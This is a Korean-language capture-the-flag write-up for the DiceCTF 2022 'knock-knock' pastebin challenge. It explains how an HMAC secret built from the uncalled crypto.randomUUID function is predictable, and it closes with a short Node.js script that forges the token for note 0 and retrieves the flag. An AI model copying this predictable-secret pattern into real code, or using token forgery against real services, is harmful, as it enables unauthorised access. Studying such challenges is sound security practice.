# DiceCTF 2022 WriteUp 
**CTF start Date: 2022-02-04 (2 day)**
***
- **[WEB] knock-knock (356 solves/107 points)**
- **[WEB] no-cookies (5 solves/415 points)**
- 

## [WEB] knock-knock 
Knock knock? Who's there? Another pastebin!!

URL: https://knock-knock.mc.ax/

(356 solves/107 points)

### Analyse
문제에서 제공된 사이트에서 글쓰기, 읽기 기능을 확인할 수 있었다.

또한 문제 사이트의 소스코드가 제공이 되어 각각의 기능들을 파악하기 수월했다.

```javascript
class Database {
  constructor() {
    this.notes = [];
    this.secret = `secret-${crypto.randomUUID}`;
  }

  createNote({ data }) {
    const id = this.notes.length;
    this.notes.push(data);
    return {
      id,
      token: this.generateToken(id),
    };
  }

  getNote({ id, token }) {
    if (token !== this.generateToken(id)) return { error: 'invalid token' };
    if (id >= this.notes.length) return { error: 'note not found' };
    return { data: this.notes[id] };
  }

  generateToken(id) {
    return crypto
      .createHmac('sha256', this.secret)
      .update(id.toString())
      .digest('hex');
  }
}
const db = new Database();
db.createNote({ data: process.env.FLAG });
```

위 소스코드는 글쓰기, 읽기를 위해 작성된 코드이며 글을 생성하기 위한 **createNote** 함수에선 글이 몇번째 글인지 확인하는 **id** 값과 id 값으로 생성되는 **token**을 만들고, 글을 읽기 위한 **getNote** 함수에선 id, token값을 받아 id값으로 token을 생성하고 전달받은 token값과 비교해 일치하면 사용자에게 id에 해당하는 글을 전달하는 것을 알 수 있다.


token을 생성하는 함수는 **generateToken** 함수이며 **this.secret** 값을 암호화 키로 id값을 sha256 HMAC으로 변환해 token을 생성한다.


**this.secret** 값은 \`secret-${crypto.randomUUID}\`와 같이 template string으로 되어 있었다.


**flag**는 서비스가 시작될 때 글로 생성되어 지는걸 확인 할 수 있었다. 
flag가 포함된 글의 id값은 createNote 함수의 `const id = this.notes.length;` 코드로 생성되기에 0의 값을 가지는걸 알 수 있다.


### Find out the secret value

this.secret 값을 파악하기 위해 this.secret에 사용된 crypto.randomUUID 값을 보았다.

```javascript
> crypto.randomUUID
[Function: randomUUID]

> crypto.randomUUID.toString()
'function randomUUID(options) {\n' +
  '  if (options !== undefined)\n' +
```

예상과는 다르게 crypto.randomUUID는 string type이 아닌 function type을 가지고 있었고 toString의 결과값은 함수의 내용을 출력하고 있었다.
따라서 \`secret-${crypto.randomUUID}\` 값은 random한 UUID값이 아닌 유추가능하고 일정한 값임을 알 수 있었다.

```javascript
> `secret-${crypto.randomUUID}`
'secret-function randomUUID(options) {\n' +
  '  if (options !== undefined)\n' +
  "    validateObject(options, 'options');\n" +
  '  const {\n' +
  '    disableEntropyCache = false,\n' +
  '  } = { ...options };\n' +
```

### Generate flag token and read flag

서버와 동일한 버전의 nodejs에서 사용해야 한다.

```javascript
const request = require('request');
const crypto = require('crypto');
uri = "https://knock-knock.mc.ax/"
secret = `secret-${crypto.randomUUID}`;
token = crypto.createHmac('sha256', secret).update('0').digest('hex');
uri += `note?id=0&token=${token}`
const options = {
        uri,
};
request.get(options, function (error, response, body) {
        console.log(body);
});
```
***
